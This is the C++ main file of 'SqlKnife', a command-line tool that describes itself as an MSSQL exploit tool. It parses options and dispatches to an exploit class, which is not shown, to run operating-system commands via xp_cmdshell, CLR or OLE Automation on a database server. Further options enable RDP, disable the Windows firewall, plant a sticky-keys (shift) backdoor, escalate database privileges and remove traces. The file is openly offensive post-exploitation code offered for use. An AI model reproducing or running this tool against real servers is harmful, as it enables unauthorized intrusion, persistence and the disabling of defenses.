// SqlKnife.cpp : 此文件包含 "main" 函数。程序执行将在此处开始并结束。
//

#include "MsSqlExploit.h"
#include "getopt.h"

//using namespace std;

void printusage(char * filename) {

	cout << R"(
    __             ____    ___     ____  
   /  \   __ __   |__  |  |_  )   |__  | 
  | () |  \ \ /     / /    / /      / /  
   \__/   /_\_\    /_/    /___|    /_/		author:hl0rey

		)" << endl;
	cout << "SqlKnife v1.0 " << endl << "A mssql exploit tool in commandline." << endl;
	cout << filename << " <-H host> <-P port> <-u username> <-p password> <-D dbname> <-c cmd> <--openrdp> <--shift> <--disfw> <--oacreate> <--clrcmd> <--clrdexec> <--xpcmd> <--dbup> <--fix> <--remove> <--3/--4>" << endl;


}

int main(int argc, char** argv) {

	if (argc == 1)
	{
		printusage(argv[0]);
		return 0;
	}

	ExecMethod method = ExecMethod::NONE;
	string cmd;
	string host = "127.0.0.1";
	string user = "sa";
	string pass = "";
	string port = "1433";
	string dbname = "master";
	bool iffix = false;
	bool shift = false;
	bool openrdp = false;
	bool disfw = false;
	bool remove = false;
	bool isdonet4 = true;

	static struct option long_option[] = {

		{"openrdp",no_argument,NULL,0},
		{"shift",no_argument,NULL,1},
		{"disfw",no_argument,NULL,2},
		{"xpcmd",no_argument,NULL,3},
		{"clrcmd",no_argument,NULL,4},
		{"oacreate",no_argument,NULL,5},
		{"clrdexec",no_argument,NULL,6},
		{"fix",no_argument,NULL,7},
		{"dbup",no_argument,NULL,8},
		{"remove",no_argument,NULL,10},
		{"3",no_argument,NULL,11},
		{"4",no_argument,NULL,12},
		{0,0,0,0}

	};

	int opt;
	//while ((opt=getopt_long_only(argc,argv,"H:u:p:P:D:c:s:a:",long_option,NULL))!=-1)
	while ((opt = getopt_long_only(argc, argv, "H:u:p:P:D:c:", long_option, NULL)) != -1)
	{
		if (opt == -1)
		{
			cout << argv[0] << " help msg." << endl;
			break;
		}
		switch (opt)
		{
		case 0:
			openrdp = true;
			continue;
		case 1:
			shift = true;
			continue;
		case 2:
			disfw = true;
			continue;
		case 3:
			method = ExecMethod::XPCMD;
			continue;
		case 4:
			method = ExecMethod::CLRCMD;
			continue;
		case 5:
			method = ExecMethod::OACREATE;
			continue;
		case 6:
			method = ExecMethod::CLRDEXEC;
			continue;
		case 7:
			iffix = true;
			continue;
		case 8:
			method = ExecMethod::DBUP;
			continue;
		case 10:
			remove = true;
			continue;
		case 11:
			isdonet4 = false;
			continue;
		case 12:
			isdonet4 = true;
			continue;
		case 'H':
			host = optarg;
			continue;
		case 'u':
			user = optarg;
			continue;
		case 'p':
			pass = optarg;
			continue;
		case 'P':
			port = optarg;
			continue;
		case 'c':
			cmd = optarg;
			continue;
		case 'D':
			dbname = optarg;
			continue;
		default:
			break;
		}
	}

	MsSqlExploit* msexp = new MsSqlExploit();
	msexp->isdonet4 = isdonet4;
	msexp->builddsn(host, port, dbname);
	msexp->connect(user, pass);

	if (shift)
	{
		msexp->sethchijack();
		return 0;
	}
	if (disfw)
	{
		msexp->disfirewall();
		return 0;
	}
	if (openrdp)
	{
		msexp->openrdp();
	}
	if (iffix)
	{
		msexp->dofix(method);
		return 0;
	}
	if (remove)
	{
		msexp->remove(method);
		return 0;
	}

	if (method != ExecMethod::NONE)
	{
		msexp->execcmd(cmd, method);
		return 0;
	}

}